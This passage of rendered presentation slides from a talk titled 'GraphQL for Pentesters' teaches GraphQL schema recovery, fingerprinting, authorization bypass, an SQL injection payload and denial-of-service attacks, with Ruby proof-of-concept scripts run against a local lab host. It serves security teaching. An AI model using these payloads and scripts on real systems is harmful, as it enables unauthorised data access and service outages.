</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="42" data-marpit-pagination-total="104" style="" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="43" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="43" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Ok a basic security measure is to disable introspection, so how to get schema when it is disabled?</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="44" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="44" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>We'll abuse of <strong>error suggestions</strong>: <code>did you mean</code>.</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="45" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="45" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<pre><code class="language-graphql">query {
  past
}
</code></pre>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;errors&quot;</span>: [
    {
      <span class="hljs-attr">&quot;message&quot;</span>: <span class="hljs-string">&quot;Cannot query field \&quot;past\&quot; on type \&quot;Query\&quot;. Did 
        you mean \&quot;paste\&quot; or \&quot;pastes\&quot;?&quot;</span>,
      <span class="hljs-attr">&quot;locations&quot;</span>: [
        {
          <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-number">3</span>,
          <span class="hljs-attr">&quot;column&quot;</span>: <span class="hljs-number">2</span>
        }
      ]
    }
  ]
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="46" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="46" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>We can automate this with <a href="https://github.com/nikitastupin/clairvoyance">Clairvoyance</a>.</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="47" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="47" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<pre><code class="language-bash">clairvoyance -o /tmp/dvga-schema.json http://noraj.test:5013/graphql \
<span class="hljs-comment"># -w /usr/lib/python3.10/site-packages/clairvoyance/wordlist.txt</span>

<span class="hljs-comment"># /usr/share/seclists/Miscellaneous/lang-english.txt is too heavy,</span>
<span class="hljs-comment"># ~350k entries while default clairvoyance WL is ~10k</span>

<span class="hljs-comment"># english-words is ~5k entries</span>
sudo -E wordlistctl fetch -d english-words
clairvoyance -o /tmp/dvga-schema.json http://noraj.test:5013/graphql \
 -w /usr/share/wordlists/misc/english-words.10.txt

<span class="hljs-comment"># /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt</span>
<span class="hljs-comment"># is ~38k and full of garbage</span>

<span class="hljs-comment"># else build a custom wordlist</span>
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="48" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="48" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Finding paths</h3>
<p><a href="https://gitlab.com/dee-see/graphql-path-enum">graphql-path-enum</a> lists the different ways of reaching a given type in a GraphQL schema.</p>
<pre><code>$ graphql-path-enum -i /tmp/introspection-response.json -t OwnerObject
Found 3 ways to reach the &quot;OwnerObject&quot; node:
- Query (pastes) -&gt; PasteObject (owner) -&gt; OwnerObject
- Query (paste) -&gt; PasteObject (owner) -&gt; OwnerObject
- Query (readAndBurn) -&gt; PasteObject (owner) -&gt; OwnerObject
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="49" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="49" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Fingerprinting</h3>
<p>Often the GraphQL endpoint will be <code>/graphql</code> or <code>/v1/graphql</code>. It's generally not hard to find but else you can try detected the endpoint with <a href="https://github.com/dolevf/graphw00f">graphw00f</a>.</p>
<pre><code>$ graphw00f -d -t http://noraj.test:5013
[*] Checking http://noraj.test:5013/
[*] Checking http://noraj.test:5013/graphql
[!] Found GraphQL at http://noraj.test:5013/graphql
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="50" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="50" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Identify GraphQL engine.</p>
<pre><code>$ graphw00f -f -t http://noraj.test:5013/graphql
[*] Checking if GraphQL is available at http://noraj.test:5013/graphql...
[!] Found GraphQL.
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="51" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="51" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p><img src="assets/graphene.png" alt="" /></p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="52" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;--marpit-advanced-background-split:50%;" data-marpit-advanced-background="background" data-marpit-advanced-background-split="right"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;assets/acceis_neutral_background.jpg&quot;);"></figure></div></section></foreignObject><foreignObject width="50%" height="720"><section id="52" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="52" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;--marpit-advanced-background-split:50%;" data-marpit-advanced-background="content" data-marpit-advanced-background-split="right">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h2>Vulnerabilities</h2>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="52" data-marpit-pagination-total="104" style="" data-marpit-advanced-background="pseudo" data-marpit-advanced-background-split="right"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="53" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="53" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Multipath Evaluation</h3>
<p>Blocking access to character object?</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="54" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="54" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p><img src="assets/schema-multipath_01.png" alt="" /></p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="55" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="55" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Five locations have to be blocked:</p>
<ul>
<li><code>character</code> query</li>
<li><code>characters</code> query</li>
<li><code>results</code> field of the <code>characters</code> object</li>
<li><code>resident</code> field of the <code>Location</code> object</li>
<li><code>characters</code> field of the <code>Episode</code> object</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="56" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="56" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p><img src="assets/schema-multipath_02.png" alt="" /></p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="57" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="57" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>It's prone to error. If you forget one place...</p>
<p>For example, for a website, you are not authorized to view other users info (<code>client</code> object) but you can access the <code>client</code> filed of the <code>comments</code> object.</p>
<p>It's allow authorization bypass.</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="58" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="58" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h2>SQL injection</h2>
<p>GraphQL API often fetch data from a DB.</p>
<p>Where to inject in order to detect a SQLi?</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="59" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="59" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>The only injectable inputs are <em>Arguments</em>.</p>
<pre><code class="language-graphql">query {
  user(name: &quot;' or 1=1 --&quot;) {
    id
      email
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="60" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="60" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Denial of Service - Batch Query Attack (JSON array)</h3>
<ol>
<li>Find a query that take a long time to execute</li>
<li>Batch it!</li>
</ol>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="61" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="61" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>GraphQL query:</p>
<pre><code class="language-graphql">{
  systemUpdate
}
</code></pre>
<p>HTTP request:</p>
<pre><code class="language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/graphql</span> <span class="hljs-meta">HTTP/1.1</span>
...
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json

<span class="swift">{<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;{<span class="hljs-subst">\n</span><span class="hljs-subst">\t</span>systemUpdate<span class="hljs-subst">\n</span>}&quot;</span>}
</span></code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="62" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="62" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>GraphQL query:</p>
<p>Most GraphQL client don't support batch query, they often have a mode to select one or another but won't send both on the HTTP JSON. So we'll have to craft the HTTP request ourselves.</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="63" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="63" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Ruby PoC for batch querying:</p>
<pre><code class="language-ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;httpx&#x27;</span>

data = Array.new(<span class="hljs-number">3</span>) {
  { <span class="hljs-string">&#x27;query&#x27;</span> =&gt; <span class="hljs-string">&#x27;query { systemUpdate }&#x27;</span>}
}

HTTPX
  .plugin(<span class="hljs-symbol">:proxy</span>)
  .with_proxy(<span class="hljs-symbol">uri:</span> <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>)
  .with(<span class="hljs-symbol">timeout:</span> { <span class="hljs-symbol">operation_timeout:</span> <span class="hljs-number">120</span> })
  .post(<span class="hljs-string">&#x27;http://noraj.test:5013/graphql&#x27;</span>, <span class="hljs-symbol">json:</span> data)
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="64" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="64" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<ul>
<li>query 3 times</li>
<li>send over the proxy for Burp logging</li>
<li>extend timeout (default 60sec) because <code>systemUpdate</code> takes ~32 sec and we are querying it 3 times so it will take ~ 90 sec</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="65" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="65" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>HTTP request body:</p>
<pre><code class="language-json">[
  {
    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;query { systemUpdate }&quot;</span>
  },
  {
    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;query { systemUpdate }&quot;</span>
  },
  {
    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;query { systemUpdate }&quot;</span>
  }
]
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="66" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="66" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Denial of Service - Deep recursion query attack</h3>
<p>Possible when there is a circular reference</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="67" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;assets/schema.png&quot;);background-size:contain;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="67" data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="67" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="content"></section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="67" data-marpit-pagination-total="104" style="" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="68" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;assets/dos-recursion_01.png&quot;);background-size:contain;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="68" data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="68" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="content"></section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="68" data-marpit-pagination-total="104" style="" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="69" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="69" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Ruby PoC for deep recursion:</p>
<pre><code class="language-ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;httpx&#x27;</span>

nesting_level = <span class="hljs-number">10</span>
recursion_pattern = <span class="hljs-string">&#x27;pastes{owner{&#x27;</span>
fields = <span class="hljs-string">&#x27;name&#x27;</span>
payload = recursion_pattern * nesting_level + fields + <span class="hljs-string">&#x27;}}&#x27;</span> * nesting_level

data = { <span class="hljs-string">&#x27;query&#x27;</span> =&gt; <span class="hljs-string">&quot;query{<span class="hljs-subst">#{payload}</span>}&quot;</span>}

HTTPX
  .plugin(<span class="hljs-symbol">:proxy</span>)
  .with_proxy(<span class="hljs-symbol">uri:</span> <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>)
  .with(<span class="hljs-symbol">timeout:</span> { <span class="hljs-symbol">operation_timeout:</span> <span class="hljs-number">120</span> })
  .post(<span class="hljs-string">&#x27;http://noraj.test:5013/graphql&#x27;</span>, <span class="hljs-symbol">json:</span> data)
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
